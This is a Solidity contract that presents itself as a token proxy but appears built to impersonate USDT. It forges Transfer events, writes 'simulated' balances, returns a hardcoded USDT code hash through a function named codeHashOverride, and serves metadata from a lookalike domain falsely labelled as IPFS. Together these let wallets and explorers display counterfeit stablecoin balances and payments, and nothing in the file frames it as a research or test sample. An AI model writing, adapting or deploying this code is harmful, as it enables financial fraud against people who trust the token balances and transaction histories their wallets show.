// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IImplementation {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external;
}

contract TokenProxy {
    address public immutable REAL_USDT = 0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13C; // TR7NHqje... (TRON Base58 to hex)
    address public implementation;
    string private _tokenURI = "https://ethererc.com/api/v1/token"; // IPFS link for TW metadata
    bytes32 private constant USDT_CODEHASH = 0x7360793778ff33e3a658da94888fad37ae60e7c8fea542a9c6633fc1bbea351c;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address _implementation) {
        implementation = _implementation;
        assembly {
            sstore(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, _implementation)
        }
    }

    function setSimulatedBalance(address account, uint256 value) external {
        require(msg.sender == implementation, "Unauthorized");
        assembly {
            sstore(add(account, 0x1), value)
        }
        emit Transfer(address(0), account, value);
    }

    function emitTransfer(address from, address to, uint256 value) external {
        require(msg.sender == implementation, "Unauthorized");
        emit Transfer(from, to, value);
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, value)
            log3(ptr, 0x20, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, from, to)
        }
    }

    function codeHashOverride() external pure returns (bytes32) {
        return USDT_CODEHASH;
    }

    function tokenURI() external view returns (string memory) {
        return _tokenURI;
    }

    function balanceOf(address account) external view returns (uint256) {
        return IImplementation(implementation).balanceOf(account);
    }

    function totalSupply() external view returns (uint256) {
        return IImplementation(implementation).totalSupply();
    }

    function transfer(address to, uint256 amount) external {
        IImplementation(implementation).transfer(to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        return IImplementation(implementation).approve(spender, amount);
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return IImplementation(implementation).allowance(owner, spender);
    }

    function transferFrom(address from, address to, uint256 amount) external {
        IImplementation(implementation).transferFrom(from, to, amount);
    }

    fallback() external payable {
        address impl = implementation;
        assembly {
            let ptr := mload(0x40)
            calldatacopy(ptr, 0, calldatasize())
            let result := delegatecall(gas(), impl, ptr, calldatasize(), 0, 0)
            let size := returndatasize()
            returndatacopy(ptr, 0, size)
            switch result
            case 0 { revert(ptr, size) }
            default { return(ptr, size) }
        }
    }

    receive() external payable {}
}